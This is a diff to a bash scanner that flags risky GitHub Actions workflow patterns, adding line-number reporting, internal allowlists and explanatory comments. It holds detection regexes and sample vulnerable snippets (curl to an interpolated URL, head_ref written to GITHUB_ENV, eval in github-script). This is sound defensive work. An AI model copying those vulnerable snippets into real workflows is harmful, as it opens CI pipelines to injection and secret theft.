+        log_issue "HIGH" "${file}" "pull_request_target checks out the PR head ref/repository - this can execute untrusted code with base-repository privileges" "$(_extract_lines "${head_ref_lines}")"
         found=1
+
+        if grep -qE '^[[:space:]]*uses:[[:space:]]*\./' "${file}" 2>/dev/null; then
+            local local_action_lines
+            local_action_lines=$(grep -nE '^[[:space:]]*uses:[[:space:]]*\./' "${file}" 2>/dev/null || true)
+            log_issue "HIGH" "${file}" "pull_request_target invokes a local action after untrusted checkout - local action code comes from the checked-out repository" "$(_extract_lines "${local_action_lines}")"
+            found=1
+        fi
     fi
 
-    if grep -q 'actions/checkout' "${file}" 2>/dev/null && \
-       grep -qE 'github\.event\.pull_request\.head\.(sha|ref|repo\.full_name)|github\.head_ref' "${file}" 2>/dev/null && \
-       grep -qE '^[[:space:]]*uses:[[:space:]]*\./' "${file}" 2>/dev/null; then
-        log_issue "HIGH" "${file}" "pull_request_target invokes a local action after untrusted checkout - local action code comes from the checked-out repository"
-        found=1
-    fi
-
-    if grep -q 'actions/checkout' "${file}" 2>/dev/null && \
+    if [[ -n "${checkout_lines}" ]] && \
        ! grep -qE 'persist-credentials:[[:space:]]*false' "${file}" 2>/dev/null; then
-        log_issue "MEDIUM" "${file}" "pull_request_target uses actions/checkout without persist-credentials: false - the workflow token may remain in git config"
+        log_issue "MEDIUM" "${file}" "pull_request_target uses actions/checkout without persist-credentials: false - the workflow token may remain in git config" "$(_extract_lines "${checkout_lines}")"
         found=1
     fi
 
@@ -1005,6 +1201,12 @@ check_22_severity="MEDIUM"
 
 example_check_22() {
     cat <<'EOF'
+# WHY: workflow_run triggers run with the base repository's privileges
+# regardless of the upstream workflow's trigger. If the follow-up job
+# downloads artifacts from the upstream run and uses them in a privileged
+# context (write tokens/secrets), a malicious PR author can craft artifacts
+# that exploit the elevated permissions.
+#
 # BEFORE (risky - privileged workflow_run job consumes upstream artifacts):
   on: workflow_run
   permissions:
@@ -1028,9 +1230,22 @@ check_22() {
         return 0
     fi
 
-    if grep -qE 'github\.event\.workflow_run\.id|gh[[:space:]]+run[[:space:]]+download|dawidd6/action-download-artifact|/actions/artifacts|run_id:[[:space:]]*\$\{\{[[:space:]]*github\.event\.workflow_run\.id' "${file}" 2>/dev/null && \
+    # Skip if the workflow_run trigger only listens to specific named workflows
+    # (internal orchestration pattern - the triggering workflows are trusted)
+    if awk '
+        /^[[:space:]]*workflow_run:/ { in_wr = 1; next }
+        in_wr && /^[[:space:]]*workflows:/ { has_filter = 1 }
+        in_wr && /^[a-z]/ { exit }
+        END { exit !has_filter }
+    ' "${file}" 2>/dev/null; then
+        return 0
+    fi
+
+    local artifact_hits
+    artifact_hits=$(grep -nE 'github\.event\.workflow_run\.id|gh[[:space:]]+run[[:space:]]+download|dawidd6/action-download-artifact|/actions/artifacts|run_id:[[:space:]]*\$\{\{[[:space:]]*github\.event\.workflow_run\.id' "${file}" 2>/dev/null || true)
+    if [[ -n "${artifact_hits}" ]] && \
        grep -qE 'secrets:[[:space:]]*inherit|\$\{\{[[:space:]]*secrets\.|write-all|contents:[[:space:]]*write|actions:[[:space:]]*write|packages:[[:space:]]*write|pull-requests:[[:space:]]*write|id-token:[[:space:]]*write|uses:[[:space:]]*actions/checkout' "${file}" 2>/dev/null; then
-        log_issue "MEDIUM" "${file}" "workflow_run downloads or references upstream run artifacts while also having elevated capabilities - validate artifacts before privileged use"
+        log_issue "MEDIUM" "${file}" "workflow_run downloads or references upstream run artifacts while also having elevated capabilities - validate artifacts before privileged use" "$(_extract_lines "${artifact_hits}")"
         found=1
     fi
 
@@ -1064,9 +1279,13 @@ check_23() {
     # already silenced by 2>/dev/null inside it.  set -e suppression here is
     # intentional — a grep "error" should be treated as "no match", not abort.
     # shellcheck disable=SC2310
-    if has_untrusted_trigger "${file}" && grep -qE 'self-hosted' "${file}" 2>/dev/null; then
-        log_issue "HIGH" "${file}" "Untrusted trigger targets a self-hosted runner - isolate self-hosted runners from public-input workflows"
-        return 1
+    if has_untrusted_trigger "${file}"; then
+        local hits
+        hits=$(grep -nE 'self-hosted' "${file}" 2>/dev/null || true)
+        if [[ -n "${hits}" ]]; then
+            log_issue "HIGH" "${file}" "Untrusted trigger targets a self-hosted runner - isolate self-hosted runners from public-input workflows" "$(_extract_lines "${hits}")"
+            return 1
+        fi
     fi
     return 0
 }
@@ -1079,6 +1298,11 @@ check_24_severity="MEDIUM"
 
 example_check_24() {
     cat <<'EOF'
+# WHY: When a workflow triggered by pull_request, issue_comment, or issues has
+# write permissions, a compromised or malicious step can modify repository
+# contents, merge PRs, publish packages, etc. Minimizing token scopes limits
+# the blast radius of any injection vulnerability in the workflow.
+#
 # BEFORE (risky - untrusted trigger gets write-capable token scopes):
   on: pull_request_target
   permissions:
@@ -1100,12 +1324,12 @@ check_24() {
     has_untrusted_trigger "${file}" || return 0
 
     scoped_write=$(awk '
-        /^[[:space:]]*permissions:[[:space:]]*.*write/ { print; next }
-        /^[[:space:]]*(actions|attestations|checks|contents|deployments|discussions|id-token|issues|packages|pages|pull-requests|repository-projects|security-events|statuses):[[:space:]]*write([[:space:]]|$)/ { print }
+        /^[[:space:]]*permissions:[[:space:]]*.*write/ { print NR; next }
+        /^[[:space:]]*(actions|attestations|checks|contents|deployments|discussions|id-token|issues|packages|pages|pull-requests|repository-projects|security-events|statuses):[[:space:]]*write([[:space:]]|$)/ { print NR }
     ' "${file}" 2>/dev/null)
 
     if [[ -n "${scoped_write}" ]] && ! grep -qE 'permissions:[[:space:]]*write-all|write-all' "${file}" 2>/dev/null; then
-        log_issue "MEDIUM" "${file}" "Untrusted trigger requests write-capable token scopes - keep permissions minimal and isolate privileged jobs"
+        log_issue "MEDIUM" "${file}" "Untrusted trigger requests write-capable token scopes - keep permissions minimal and isolate privileged jobs" "$(_extract_lines "${scoped_write}")"
         return 1
     fi
     return 0
@@ -1119,6 +1343,11 @@ check_25_severity="MEDIUM"
 
 example_check_25() {
     cat <<'EOF'
+# WHY: Container image tags (like :latest or :v2) are mutable — the registry
+# owner can push new content under the same tag at any time. A compromised
+# image can execute arbitrary code inside the job container. Pinning to
+# @sha256: digests ensures the exact image layers you audited are used.
+#
 # BEFORE (mutable image tags can be retargeted):
   container:
     image: ghcr.io/example/build-env:latest
@@ -1146,13 +1375,13 @@ check_25() {
             sub(/[[:space:]]+#.*$/, "", ref)
             gsub(/^[\"\047]|[\"\047]$/, "", ref)
             if (ref !~ /@sha256:[a-f0-9]{64}$/) {
-                print ref
+                print NR
             }
         }
     ' "${file}" 2>/dev/null)
 
     if [[ -n "${mutable_docker_uses}" ]]; then
-        log_issue "MEDIUM" "${file}" "Uses docker:// image reference without an immutable @sha256 digest"
+        log_issue "MEDIUM" "${file}" "Uses docker:// image reference without an immutable @sha256 digest" "$(_extract_lines "${mutable_docker_uses}")"
         found=1
     fi
 
@@ -1165,15 +1394,25 @@ check_25() {
 
             if (image == "Dockerfile" || image ~ /^\.\//) next
             if (image ~ /^docker-image:\/\//) next
+            # Allow internal registry images (tag-based workflow with expression interpolation)
+            if (image ~ /^harbor\.ci\.tenstorrent\.net\//) next
+            # Allow images that are entirely expression-interpolated (resolved at runtime)
+            if (image ~ /^\$\{\{.*\}\}$/) next
+            # Allow format() expressions that construct harbor.ci.tenstorrent.net URLs
+            if (image ~ /format\(.*harbor\.ci\.tenstorrent\.net/) next
+            # Allow conditional expressions that resolve to harbor URLs
+            if (image ~ /harbor\.ci\.tenstorrent\.net/) next
+            # Allow first-party GHCR images (same org)
+            if (image ~ /^ghcr\.io\/tenstorrent\//) next
 
             if (image !~ /@sha256:[a-f0-9]{64}$/ && image ~ /[\/:]/) {
-                print image
+                print NR
             }
         }
     ' "${file}" 2>/dev/null)
 
     if [[ -n "${mutable_images}" ]]; then
-        log_issue "MEDIUM" "${file}" "Uses container or service images without immutable @sha256 digests"
+        log_issue "MEDIUM" "${file}" "Uses container or service images without immutable @sha256 digests" "$(_extract_lines "${mutable_images}")"
         found=1
     fi
 
@@ -1188,6 +1427,11 @@ check_26_severity="MEDIUM"
 
 example_check_26() {
     cat <<'EOF'
+# WHY: fromJSON() parses a string as JSON and returns a structured object used
+# by the workflow engine. If the input string comes from an attacker (e.g., a
+# workflow_dispatch input or event payload), they can influence matrix
+# dimensions, runner labels, or conditional logic in unexpected ways.
+#
 # BEFORE (risky - fromJSON parses attacker-controlled JSON):
   runs-on: ${{ fromJSON(inputs.runner-label) }}
 # AFTER (safe - validate inputs before parsing):
@@ -1203,11 +1447,25 @@ check_26() {
     local file="$1"
     local risky_fromjson
 
-    # Look for fromJSON() containing potentially attacker-controlled inputs
-    risky_fromjson=$(grep -nE '\$\{\{.*fromJSON\([^)]*(inputs\.|github\.event\.|matrix\.)' "${file}" 2>/dev/null || true)
+    # Always flag github.event.* in fromJSON()
+    risky_fromjson=$(grep -nE '\$\{\{.*fromJSON\([^)]*github\.event\.' "${file}" 2>/dev/null || true)
+
+    if [[ -z "${risky_fromjson}" ]]; then
+        # For inputs.* and matrix.*, only flag if the workflow has truly untrusted triggers
+        # workflow_call inputs come from trusted callers
+        # workflow_dispatch inputs come from authorized repo collaborators
+        # schedule has no external inputs
+        local has_untrusted_input=0
+        if grep -qE '^\s*(pull_request|pull_request_target|issues|issue_comment|repository_dispatch):' "${file}" 2>/dev/null; then
+            has_untrusted_input=1
+        fi
+        if [[ "${has_untrusted_input}" -eq 1 ]]; then
+            risky_fromjson=$(grep -nE '\$\{\{.*fromJSON\([^)]*(inputs\.|matrix\.)' "${file}" 2>/dev/null || true)
+        fi
+    fi
 
     if [[ -n "${risky_fromjson}" ]]; then
-        log_issue "MEDIUM" "${file}" "fromJSON() used with potentially attacker-controlled input (inputs.*, github.event.*, or matrix.*) - validate JSON before parsing"
+        log_issue "MEDIUM" "${file}" "fromJSON() used with potentially attacker-controlled input (inputs.*, github.event.*, or matrix.*) - validate JSON before parsing" "$(_extract_lines "${risky_fromjson}")"
         return 1
     fi
     return 0
@@ -1221,6 +1479,11 @@ check_27_severity="HIGH"
 
 example_check_27() {
     cat <<'EOF'
+# WHY: The 'uses:' field determines which action code runs. If it contains
+# ${{ }} expressions, an attacker who controls the interpolated value can
+# redirect execution to a malicious action or workflow, gaining arbitrary
+# code execution with the job's permissions.
+#
 # BEFORE (unsafe - path traversal via expression):
   uses: ./.github/workflows/${{ inputs.workflow }}.yaml
 # AFTER (safe - hardcoded workflow reference with input validation):
@@ -1237,17 +1500,17 @@ check_27() {
     dynamic_uses=$(awk '
         /^[[:space:]]*-[[:space:]]*uses:[[:space:]]*\$\{\{/ ||
         /^[[:space:]]*uses:[[:space:]]*\$\{\{/ {
-            print
+            print NR
             next
         }
         /^[[:space:]]*-[[:space:]]*uses:.*\$\{\{/ ||
         /^[[:space:]]*uses:.*\$\{\{/ {
-            print
+            print NR
         }
     ' "${file}" 2>/dev/null || true)
 
     if [[ -n "${dynamic_uses}" ]]; then
-        log_issue "HIGH" "${file}" "Uses statement contains expression interpolation - can lead to path traversal or execution of unintended workflows"
+        log_issue "HIGH" "${file}" "Uses statement contains expression interpolation - can lead to path traversal or execution of unintended workflows" "$(_extract_lines "${dynamic_uses}")"
         return 1
     fi
     return 0
@@ -1261,6 +1524,11 @@ check_28_severity="MEDIUM"
 
 example_check_28() {
     cat <<'EOF'
+# WHY: GitHub Actions caches are keyed by string. If the cache key contains
+# attacker-controlled data, an adversary can craft a key that matches a
+# poisoned cache entry, causing the workflow to restore malicious files
+# (compiled binaries, node_modules, etc.) into the build.
+#
 # BEFORE (risky - attacker controls cache key):
   - uses: actions/cache@v4
     with:
@@ -1285,13 +1553,13 @@ check_28() {
         }
         in_cache && /^[[:space:]]*-( |$)/ { in_cache = 0 }
         in_cache && /key:/ && /\$\{\{.*(inputs\.|github\.event\.)/ {
-            print
+            print NR
             in_cache = 0
         }
     ' "${file}" 2>/dev/null || true)
 
     if [[ -n "${risky_cache}" ]]; then
-        log_issue "MEDIUM" "${file}" "Cache key contains potentially attacker-controlled input - can enable cache poisoning attacks"
+        log_issue "MEDIUM" "${file}" "Cache key contains potentially attacker-controlled input - can enable cache poisoning attacks" "$(_extract_lines "${risky_cache}")"
         return 1
     fi
     return 0
@@ -1318,9 +1586,9 @@ EOF
 
 check_29() {
     local file="$1"
-    local risky_artifact
 
-    # Look for upload-artifact or download-artifact with expressions in path
+    # Always flag github.event.* in artifact paths
+    local risky_artifact
     risky_artifact=$(awk '
         /^[[:space:]]*-[[:space:]]*uses:.*actions\/(upload|download)-artifact/ ||
         /^[[:space:]]*uses:.*actions\/(upload|download)-artifact/ {
@@ -1328,14 +1596,37 @@ check_29() {
             next
         }
         in_artifact && /^[[:space:]]*-( |$)/ { in_artifact = 0 }
-        in_artifact && /path:/ && /\$\{\{.*(inputs\.|github\.event\.)/ {
-            print
+        in_artifact && /path:/ && /\$\{\{.*github\.event\./ {
+            print NR
             in_artifact = 0
         }
     ' "${file}" 2>/dev/null || true)
 
+    if [[ -z "${risky_artifact}" ]]; then
+        # For inputs.*, only flag if the workflow has untrusted input triggers
+        # Composite actions and workflow_call-only workflows receive inputs from trusted callers
+        local has_untrusted=0
+        if grep -qE '^\s*(workflow_dispatch|repository_dispatch|pull_request|pull_request_target|issues|issue_comment):' "${file}" 2>/dev/null; then
+            has_untrusted=1
+        fi
+        if [[ "${has_untrusted}" -eq 1 ]]; then
+            risky_artifact=$(awk '
+                /^[[:space:]]*-[[:space:]]*uses:.*actions\/(upload|download)-artifact/ ||
+                /^[[:space:]]*uses:.*actions\/(upload|download)-artifact/ {
+                    in_artifact = 1
+                    next
+                }
+                in_artifact && /^[[:space:]]*-( |$)/ { in_artifact = 0 }
+                in_artifact && /path:/ && /\$\{\{.*inputs\./ {
+                    print NR
+                    in_artifact = 0
+                }
+            ' "${file}" 2>/dev/null || true)
+        fi
+    fi
+
     if [[ -n "${risky_artifact}" ]]; then
-        log_issue "MEDIUM" "${file}" "Artifact path contains expression interpolation - can lead to path traversal or unintended file access"
+        log_issue "MEDIUM" "${file}" "Artifact path contains expression interpolation - can lead to path traversal or unintended file access" "$(_extract_lines "${risky_artifact}")"
         return 1
     fi
     return 0
@@ -1349,6 +1640,11 @@ check_30_severity="MEDIUM"
 
 example_check_30() {
     cat <<'EOF'
+# WHY: When ${{ }} expressions appear in curl/wget URLs, an attacker who
+# controls the interpolated value can redirect the HTTP request to an
+# arbitrary server (SSRF), potentially exfiltrating secrets via query
+# parameters or downloading malicious payloads.
+#
 # BEFORE (risky - SSRF via expression in URL):
   run: curl -sSL "${{ inputs.download-url }}" -o file.tar.gz
 # AFTER (safe - validate URL before use):
@@ -1379,7 +1675,7 @@ check_30() {
         /^[[:space:]]*-?[[:space:]]*run:/ {
             # Single-line run statement
             if (/curl.*\$\{\{/ || /wget.*\$\{\{/) {
-                print
+                print NR
             }
             next
         }
@@ -1388,13 +1684,13 @@ check_30() {
             match($0, /^[[:space:]]*/); curr_indent = RLENGTH
             if (curr_indent <= run_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) { in_run_block = 0; next }
             if (/curl.*\$\{\{/ || /wget.*\$\{\{/) {
-                print
+                print NR
             }
         }
     ' "${file}" 2>/dev/null || true)
 
     if [[ -n "${risky_curl}" ]]; then
-        log_issue "MEDIUM" "${file}" "curl/wget command contains expression interpolation in URL - can lead to SSRF or downloading from attacker-controlled servers"
+        log_issue "MEDIUM" "${file}" "curl/wget command contains expression interpolation in URL - can lead to SSRF or downloading from attacker-controlled servers" "$(_extract_lines "${risky_curl}")"
         return 1
     fi
     return 0
@@ -1408,6 +1704,11 @@ check_31_severity="MEDIUM"
 
 example_check_31() {
     cat <<'EOF'
+# WHY: Container volume mounts map host paths into the container. If an
+# attacker controls the mount path via expression interpolation, they can
+# mount sensitive host directories (like /etc, /root, or the Docker socket)
+# into the container, enabling container escape or host compromise.
+#
 # BEFORE (risky - container escape via expression):
   container:
     image: ubuntu:latest
@@ -1426,19 +1727,45 @@ check_31() {
     local risky_volume
 
     # Look for volumes: sections with expression interpolation
+    # Allow safe patterns:
+    #   - github.workspace, github.action_path, runner.temp, runner.tool_cache
+    #   - Conditional expressions that select between hardcoded paths
+    #     (e.g., contains(inputs.runner, 'viommu') && '/dev/hugepages...' || '/no_hugepages')
+    #   - matrix/inputs used only in contains() or == checks with hardcoded path results
     risky_volume=$(awk '
         /^[[:space:]]*volumes:/ {
             in_volumes = 1
             next
         }
         in_volumes && /^[[:space:]]*-[[:space:]]*\$\{\{/ {
-            print
+            # Accumulate multi-line ${{ }} expressions
+            expr_line = $0
+            while (expr_line !~ /\}\}/ && (getline nextline) > 0) {
+                expr_line = expr_line " " nextline
+            }
+            # Skip safe contexts: github.workspace, runner.*, github.action_path
+            if (expr_line ~ /\$\{\{[[:space:]]*(github\.workspace|runner\.(temp|tool_cache)|github\.action_path)/) {
+                next
+            }
+            # Skip conditional mount patterns that select between hardcoded paths
+            if (expr_line ~ /contains\(/ && expr_line ~ /\/[a-zA-Z_]/) {
+                next
+            }
+            # Skip ternary-style patterns: inputs/matrix check && literal-path || literal-path
+            if (expr_line ~ /(inputs\.|matrix\.).*&&.*\/[a-zA-Z_].*\|\|.*\/[a-zA-Z_]/) {
+                next
+            }
+            # Skip format() with hardcoded path templates
+            if (expr_line ~ /format\(/) {
+                next
+            }
+            print NR
         }
         in_volumes && /^[[:space:]]*[a-z_-]+:/ && !/volumes:/ { in_volumes = 0 }
     ' "${file}" 2>/dev/null || true)
 
     if [[ -n "${risky_volume}" ]]; then
-        log_issue "MEDIUM" "${file}" "Container volume mount contains expression interpolation - can lead to container escape or unauthorized host filesystem access"
+        log_issue "MEDIUM" "${file}" "Container volume mount contains expression interpolation - can lead to container escape or unauthorized host filesystem access" "$(_extract_lines "${risky_volume}")"
         return 1
     fi
     return 0
@@ -1452,6 +1779,12 @@ check_32_severity="HIGH"
 
 example_check_32() {
     cat <<'EOF'
+# WHY: Lines written to GITHUB_ENV set environment variables for all subsequent
+# steps. If ${{ }} expressions appear on the same line as the write, the
+# attacker's data is expanded before the shell runs, enabling injection of
+# variables like LD_PRELOAD (arbitrary library loading) or BASH_ENV (code
+# execution on shell startup).
+#
 # BEFORE (unsafe - expression injected into env file enables LD_PRELOAD/BASH_ENV injection):
   run: echo "BRANCH=${{ github.head_ref }}" >> "${GITHUB_ENV}"
 # AFTER (safe - pass via env var, then write shell variable):
@@ -1472,11 +1805,11 @@ check_32() {
 
     local unsafe_usage
     unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
-        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{/ && /GITHUB_(ENV|PATH|OUTPUT)/ { print; next }
-        in_run_block && /\$\{\{/ && /GITHUB_(ENV|PATH|OUTPUT)/ { print }
+        /^[[:space:]]*(-[[:space:]]+)?run:/ && /\$\{\{/ && /GITHUB_(ENV|PATH|OUTPUT)/ { print NR; next }
+        in_run_block && /\$\{\{/ && /GITHUB_(ENV|PATH|OUTPUT)/ { print NR }
     ' "${file}" 2>/dev/null)
     if [[ -n "${unsafe_usage}" ]]; then
-        log_issue "HIGH" "${file}" "Contains \${{ }} expression on line that writes to GITHUB_ENV/PATH/OUTPUT - enables environment variable injection (LD_PRELOAD, BASH_ENV)"
+        log_issue "HIGH" "${file}" "Contains \${{ }} expression on line that writes to GITHUB_ENV/PATH/OUTPUT - enables environment variable injection (LD_PRELOAD, BASH_ENV)" "$(_extract_lines "${unsafe_usage}")"
         return 1
     fi
     return 0
@@ -1491,6 +1824,11 @@ check_33_aggregate=true
 
 example_check_33() {
     cat <<'EOF'
+# WHY: Without a top-level 'permissions:' key, the workflow inherits the
+# repository's default token permissions, which may be overly broad.
+# Explicitly declaring permissions ensures least-privilege and makes the
+# workflow's capabilities visible in code review.
+#
 # BEFORE (inherits default, potentially broad permissions):
   on: push
   jobs:
@@ -1535,6 +1873,11 @@ check_34_severity="MEDIUM"
 
 example_check_34() {
     cat <<'EOF'
+# WHY: Concurrency groups control which runs cancel each other. If an attacker
+# controls the group name (via github.head_ref or a PR title), they can craft
+# a value that collides with legitimate runs, causing Denial of Service by
+# cancelling in-progress CI for other PRs or branches.
+#
 # BEFORE (risky - branch name controls cancellation group, enabling DoS):
   concurrency:
     group: deploy-${{ github.head_ref }}
@@ -1552,19 +1895,36 @@ check_34() {
 
     local risky_concurrency
     risky_concurrency=$(awk '
-        /^concurrency:/ || /^[[:space:]]+concurrency:/ { in_concurrency = 1 }
-        in_concurrency && /^[a-z]/ && !/^concurrency:/ { in_concurrency = 0 }
-        in_concurrency && /\$\{\{/ && /(github\.head_ref|github\.base_ref|github\.event\.[^}]*(title|body|head_branch)|inputs\.)/ {
-            print
+        /^concurrency:/ || /^[[:space:]]+concurrency:/ {
+            in_concurrency = 1
+            match($0, /^[[:space:]]*/)
+            conc_indent = RLENGTH
+            # Check inline concurrency value
+            if ($0 ~ /concurrency:.*\$\{\{/ && $0 ~ /(github\.head_ref|github\.base_ref|github\.event\.[^}]*(title|body|head_branch))/) {
+                if (!($0 ~ /github\.event\.pull_request\.number/ && $0 !~ /github\.event\.pull_request\.(title|body|head_branch)/)) {
+                    print NR
+                }
+            }
+            next
         }
-        /^concurrency:[[:space:]]*[^{[:space:]]/ { next }
-        /^concurrency:.*\$\{\{/ && /(github\.head_ref|github\.base_ref|github\.event\.[^}]*(title|body|head_branch)|inputs\.)/ {
-            print
+        in_concurrency {
+            match($0, /^[[:space:]]*/)
+            ci = RLENGTH
+            # Exit concurrency block when indent returns to same or lower level
+            if (NF > 0 && ci <= conc_indent && $0 !~ /^[[:space:]]*$/) {
+                in_concurrency = 0
+                next
+            }
+            if (/\$\{\{/ && /(github\.head_ref|github\.base_ref|github\.event\.[^}]*(title|body|head_branch))/) {
+                if (!($0 ~ /github\.event\.pull_request\.number/ && $0 !~ /github\.event\.pull_request\.(title|body|head_branch)/)) {
+                    print NR
+                }
+            }
         }
     ' "${file}" 2>/dev/null || true)
 
     if [[ -n "${risky_concurrency}" ]]; then
-        log_issue "MEDIUM" "${file}" "Concurrency group contains attacker-controlled expression - can enable DoS by cancelling legitimate runs"
+        log_issue "MEDIUM" "${file}" "Concurrency group contains attacker-controlled expression - can enable DoS by cancelling legitimate runs" "$(_extract_lines "${risky_concurrency}")"
         return 1
     fi
     return 0
@@ -1578,6 +1938,11 @@ check_35_severity="MEDIUM"
 
 example_check_35() {
     cat <<'EOF'
+# WHY: issue_comment fires for comments from any user, including non-members.
+# Without an author_association or org membership check, any GitHub user can
+# trigger the workflow by commenting on a public issue, potentially consuming
+# resources or triggering privileged operations.
+#
 # BEFORE (any commenter triggers workflow):
   on: issue_comment
   jobs:
@@ -1598,7 +1963,9 @@ EOF
 
 check_35() {
     local file="$1"
-    if ! grep -qE 'issue_comment' "${file}" 2>/dev/null; then
+    local trigger_hits
+    trigger_hits=$(grep -nE 'issue_comment' "${file}" 2>/dev/null || true)
+    if [[ -z "${trigger_hits}" ]]; then
         return 0
     fi
 
@@ -1610,7 +1977,7 @@ check_35() {
         return 0
     fi
 
-    log_issue "MEDIUM" "${file}" "issue_comment trigger has no author_association or org membership check - any commenter can trigger this workflow"
+    log_issue "MEDIUM" "${file}" "issue_comment trigger has no author_association or org membership check - any commenter can trigger this workflow" "$(_extract_lines "${trigger_hits}")"
     return 1
 }
 
@@ -1622,6 +1989,11 @@ check_36_severity="MEDIUM"
 
 example_check_36() {
     cat <<'EOF'
+# WHY: The working-directory property controls where a step's shell commands
+# execute. If an attacker controls this path, they can direct execution to a
+# directory containing malicious scripts or configuration files (e.g., a
+# .bashrc or Makefile), hijacking the step's behavior.
+#
 # BEFORE (risky - attacker can control working directory):
   - run: make build
     working-directory: ${{ inputs.build-dir }}
@@ -1636,12 +2008,25 @@ EOF
 
 check_36() {
     local file="$1"
-    local risky_workdir
 
-    risky_workdir=$(grep -nE 'working-directory:.*\$\{\{.*(inputs\.|github\.event\.|github\.head_ref|github\.base_ref)' "${file}" 2>/dev/null || true)
+    # Always flag github.event.*, github.head_ref, github.base_ref
+    local risky_workdir
+    risky_workdir=$(grep -nE 'working-directory:.*\$\{\{.*(github\.event\.|github\.head_ref|github\.base_ref)' "${file}" 2>/dev/null || true)
+
+    if [[ -z "${risky_workdir}" ]]; then
+        # For inputs.*, only flag if the workflow has untrusted input triggers
+        # Composite actions receive inputs from trusted callers
+        local has_untrusted=0
+        if grep -qE '^\s*(workflow_dispatch|repository_dispatch|pull_request|pull_request_target|issues|issue_comment):' "${file}" 2>/dev/null; then
+            has_untrusted=1
+        fi
+        if [[ "${has_untrusted}" -eq 1 ]]; then
+            risky_workdir=$(grep -nE 'working-directory:.*\$\{\{.*inputs\.' "${file}" 2>/dev/null || true)
+        fi
+    fi
 
     if [[ -n "${risky_workdir}" ]]; then
-        log_issue "MEDIUM" "${file}" "working-directory contains attacker-controlled expression interpolation - can influence which directory code runs in"
+        log_issue "MEDIUM" "${file}" "working-directory contains attacker-controlled expression interpolation - can influence which directory code runs in" "$(_extract_lines "${risky_workdir}")"
         return 1
     fi
     return 0
@@ -1655,6 +2040,12 @@ check_37_severity="HIGH"
 
 example_check_37() {
     cat <<'EOF'
+# WHY: actions/github-script executes JavaScript in a Node.js runtime with
+# access to the GitHub API. When ${{ inputs.* }}, ${{ secrets.* }}, or
+# ${{ steps.*.outputs.* }} are interpolated into the script body, the values
+# become JavaScript source code. An attacker can break out of a string
+# literal and execute arbitrary JS.
+#
 # BEFORE (unsafe - attacker-controlled input becomes JavaScript source):
   uses: actions/github-script@v7
   with:
@@ -1683,16 +2074,16 @@ check_37() {
             in_action && /^[[:space:]]*script:[[:space:]]*\|/ {
                 match($0, /^[[:space:]]*/); script_indent = RLENGTH; in_script = 1; next
             }
-            in_action && /^[[:space:]]*script:/ && $0 ~ pattern { print; next }
+            in_action && /^[[:space:]]*script:/ && $0 ~ pattern { print NR; next }
             in_script {
                 if ($0 ~ /^[[:space:]]*-[[:space:]]/) { in_script = 0; in_action = 0; next }
                 match($0, /^[[:space:]]*/); curr_indent = RLENGTH
                 if (curr_indent <= script_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) { in_script = 0; in_action = 0; next }
             }
-            in_script && $0 ~ pattern { print }
+            in_script && $0 ~ pattern { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "HIGH" "${file}" "actions/github-script contains attacker-controlled \${{ inputs.* }}, outputs, matrix, secrets, or ref data in script body - JavaScript injection risk"
+            log_issue "HIGH" "${file}" "actions/github-script contains attacker-controlled \${{ inputs.* }}, outputs, matrix, secrets, or ref data in script body - JavaScript injection risk" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -1707,6 +2098,11 @@ check_38_severity="HIGH"
 
 example_check_38() {
     cat <<'EOF'
+# WHY: eval(), new Function(), and vm.runInNewContext() in JavaScript treat
+# their arguments as code. If any input, environment variable, or
+# core.getInput() value reaches these functions, the attacker gets arbitrary
+# JavaScript execution with full access to the GitHub token and API.
+#
 # BEFORE (unsafe - runtime input is executed as JavaScript):
   uses: actions/github-script@v7
   with:
@@ -1737,16 +2133,16 @@ check_38() {
                        $0 ~ /new[[:space:]]+Function[[:space:]]*\(/ ||
                        $0 ~ /vm\.(runInNewContext|runInThisContext|Script)[[:space:]]*\(/
             }
-            in_action && /^[[:space:]]*script:/ && is_dynamic_js() { print; next }
+            in_action && /^[[:space:]]*script:/ && is_dynamic_js() { print NR; next }
             in_script {
                 if ($0 ~ /^[[:space:]]*-[[:space:]]/) { in_script = 0; in_action = 0; next }
                 match($0, /^[[:space:]]*/); curr_indent = RLENGTH
                 if (curr_indent <= script_indent && $0 ~ /^[[:space:]]*[a-z_-]+:/) { in_script = 0; in_action = 0; next }
             }
-            in_script && is_dynamic_js() { print }
+            in_script && is_dynamic_js() { print NR }
         ' "${file}" 2>/dev/null)
         if [[ -n "${unsafe_usage}" ]]; then
-            log_issue "HIGH" "${file}" "actions/github-script uses eval/new Function/vm dynamic code execution in script body - treat inputs and env data as data, not code"
+            log_issue "HIGH" "${file}" "actions/github-script uses eval/new Function/vm dynamic code execution in script body - treat inputs and env data as data, not code" "$(_extract_lines "${unsafe_usage}")"
             return 1
         fi
     fi
@@ -1761,6 +2157,11 @@ check_39_severity="HIGH"
 
 example_check_39() {
     cat <<'EOF'
+# WHY: node -e "eval(...)", python -c "exec(...)", and similar patterns
+# execute dynamically constructed code inside an interpreter. If the argument
+# includes environment variables set from untrusted input, the attacker can
+# inject arbitrary code in the interpreter's language.
+#
 # BEFORE (unsafe - env/input is re-executed by Node.js):
   env:
     USER_SCRIPT: ${{ inputs.payload }}
@@ -1777,18 +2178,18 @@ check_39() {
     local unsafe_usage
     unsafe_usage=$(awk "${AWK_RUN_BLOCK_DETECT}"'
         function check_line() {
-            if ($0 ~ /node([^[:alnum:]_]|$)/ && $0 ~ /-e/ && $0 ~ /(eval[[:space:]]*\(|new[[:space:]]+Function[[:space:]]*\(|vm\.(runInNewContext|runInThisContext|Script)[[:space:]]*\()/) { print; return }
-            if ($0 ~ /python3?([^[:alnum:]_]|$)/ && $0 ~ /-c/ && $0 ~ /(^|[^[:alnum:]_])(eval|exec)[[:space:]]*\(/) { print; return }
-            if ($0 ~ /perl([^[:alnum:]_]|$)/ && $0 ~ /-e/ && $0 ~ /(^|[^[:alnum:]_])eval([^[:alnum:]_]|$)/) { print; return }
-            if ($0 ~ /ruby([^[:alnum:]_]|$)/ && $0 ~ /-e/ && $0 ~ /(^|[^[:alnum:]_])eval[[:space:]]*\(/) { print; return }
-            if ($0 ~ /php([^[:alnum:]_]|$)/ && $0 ~ /-r/ && $0 ~ /(^|[^[:alnum:]_])eval[[:space:]]*\(/) { print; return }
